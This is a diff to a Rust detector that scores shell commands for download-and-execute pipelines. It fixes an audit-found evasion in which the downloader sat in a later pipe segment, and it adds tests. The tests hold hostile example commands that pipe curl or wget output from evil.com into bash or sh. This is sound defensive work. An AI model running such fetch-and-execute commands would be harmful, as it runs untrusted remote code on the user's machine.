@@ -307,23 +307,39 @@ pub fn check_tmp_execution(content: &str) -> Option<(&'static str, u32)> {
 }
 
 /// Check for download-and-execute via pipe. Returns score.
+///
+/// # Wave 2 (AUDIT-WAVE2-PIPE-EVASION)
+///
+/// Pre-fix the detector only inspected `parts[0]` (the FIRST pipe
+/// segment) for the downloader, which was trivially evadable by
+/// reordering: `cmd | curl evil.com | bash` placed the downloader in
+/// segment 1, not 0, and slipped through. The new logic scans for a
+/// downloader in ANY segment AND requires an executor in any LATER
+/// segment, preserving the temporal-order intent (download then
+/// execute) without depending on the downloader being at the head of
+/// the pipe.
 pub fn check_download_execute_pipe(content: &str) -> Option<u32> {
     if !content.contains('|') {
         return None;
     }
-    let parts: Vec<&str> = content.split('|').collect();
+    let parts: Vec<String> = content.split('|').map(|p| p.to_ascii_lowercase()).collect();
     if parts.len() < 2 {
         return None;
     }
-    let left = parts[0].to_ascii_lowercase();
-    let right = parts[1..].join("|").to_ascii_lowercase();
-    let has_downloader = DOWNLOADERS.iter().any(|d| left.contains(d));
-    let has_executor = EXECUTORS.iter().any(|e| {
-        right
-            .split_whitespace()
-            .any(|w| w.trim_start_matches("./") == *e)
+    // Find the FIRST segment that contains a downloader. The downloader
+    // must be followed (in a LATER segment) by an executor for this to
+    // count as a download-and-execute chain. Scanning from the front
+    // keeps the temporal anchor: downloads happen, then their output
+    // gets piped into something. Any executor appearing BEFORE the
+    // downloader cannot be running the downloaded payload.
+    let downloader_at = parts
+        .iter()
+        .position(|seg| DOWNLOADERS.iter().any(|d| seg.contains(d)))?;
+    let has_executor_after = parts[downloader_at + 1..].iter().any(|seg| {
+        seg.split_whitespace()
+            .any(|w| EXECUTORS.iter().any(|e| w.trim_start_matches("./") == *e))
     });
-    if has_downloader && has_executor {
+    if has_executor_after {
         Some(40)
     } else {
         None
@@ -411,6 +427,65 @@ mod tests {
             Some(40)
         );
         assert!(check_download_execute_pipe("echo hello").is_none());
+    }
+
+    // ── Wave 2 anchors (AUDIT-WAVE2-PIPE-EVASION) ─────────────────────
+    //
+    // Pre-fix `check_download_execute_pipe` only inspected `parts[0]`
+    // for the downloader. Reordering the pipe trivially evaded
+    // detection: `cmd | curl evil.com | bash` placed the downloader in
+    // segment 1 and slipped through. The new implementation scans for
+    // a downloader anywhere AND requires an executor in any LATER
+    // segment.
+
+    #[test]
+    fn detects_download_pipe_with_downloader_in_middle_segment() {
+        // The exact evasion shape ultrareview flagged. Pre-fix:
+        // returned None (downloader not in parts[0]).
+        // Post-fix: returns Some(40) (downloader in segment 1, executor
+        // in segment 2).
+        assert_eq!(
+            check_download_execute_pipe("echo prefix | curl http://evil.com/x | bash"),
+            Some(40),
+            "downloader in middle segment must still be detected"
+        );
+        // Multiple noise prefixes - downloader still found.
+        assert_eq!(
+            check_download_execute_pipe("ls | grep foo | wget http://evil.com/x | sh"),
+            Some(40),
+            "downloader in any segment with later executor must trip detector"
+        );
+    }
+
+    #[test]
+    fn does_not_detect_executor_before_downloader() {
+        // Temporal correctness: an executor in segment 0 followed by
+        // a downloader in segment 1 is NOT a download-and-execute
+        // chain (the executor cannot run something not yet downloaded).
+        // Anti-regression for a future "any executor anywhere"
+        // simplification that would over-trigger.
+        assert!(
+            check_download_execute_pipe("bash | curl http://evil.com/x").is_none(),
+            "executor BEFORE downloader is not download-and-execute"
+        );
+    }
+
+    #[test]
+    fn does_not_detect_downloader_without_subsequent_executor() {
+        // Plain download with no execution downstream: a person
+        // running `curl evil.com | tee out.txt` is downloading but not
+        // executing. Must NOT trip this specific detector.
+        assert!(
+            check_download_execute_pipe("curl http://evil.com/x | tee /tmp/out").is_none(),
+            "download without subsequent executor must not trip"
+        );
+    }
+
+    #[test]
+    fn does_not_detect_double_pipe_with_only_downloader() {
+        // Downloader is present, multiple pipe segments follow, but
+        // none contain an executor.
+        assert!(check_download_execute_pipe("curl http://evil.com/x | grep foo | wc -l").is_none());
     }
 
     #[test]
